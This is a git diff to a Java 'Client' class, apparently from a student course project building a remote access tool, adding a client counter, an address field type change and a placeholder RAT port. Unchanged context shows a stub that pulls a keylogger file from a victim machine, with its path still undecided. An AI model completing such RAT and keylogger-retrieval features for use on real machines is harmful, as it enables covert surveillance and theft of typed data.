@@ -2,22 +2,32 @@ package edu.wit.comp2100;
 
 import java.io.File;
 import java.net.Inet4Address;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
 import java.nio.file.Path;
 
 public class Client {
 
     //class variables
-    private String machineName;
-    private Inet4Address Server_IP;
+    private String clientName;
+    private static int numClients;
+    private InetAddress Server_IP; //TODO fix cannot use Inet4Address (get compulation error from Client() constructor
     private Inet4Address RAT_IP;
     private boolean isActive;
     private File lastRecievedFile;
+    private final int DEFAULT_RAT_PORT = 0; //TODO decide on default port for rat client
 
-    Client(){
-        this.Server_IP = Inet4Address.getLocalHost(); //TODO handle UnknownHostException
+    Client() throws UnknownHostException {
+        /*
+        TODO fix cannot use Inet4Address. Inet4Address.getLocalHost() gives us a compilation error.
+        InetAddress is a superclass of Inet4Address so it is not compatible.
+        How do we get the local machine address in Inet4 format?
+         */
+        this.Server_IP = InetAddress.getLocalHost(); //TODO handle UnknownHostException
+        this.clientName = "Client" + ++numClients; //increment number of clients and name client next number
     }
 
-    Client(Inet4Address client_IP){
+    Client(Inet4Address client_IP) throws UnknownHostException{
         this();
         this.RAT_IP = client_IP;
     }
@@ -76,5 +86,9 @@ public class Client {
          */
         Path keylogPath = null; //TODO decide on default path for keylogger file
         return pullFile(keylogPath);
+    }
+
+    public String getClientName(){
+        return clientName;
     }
 }
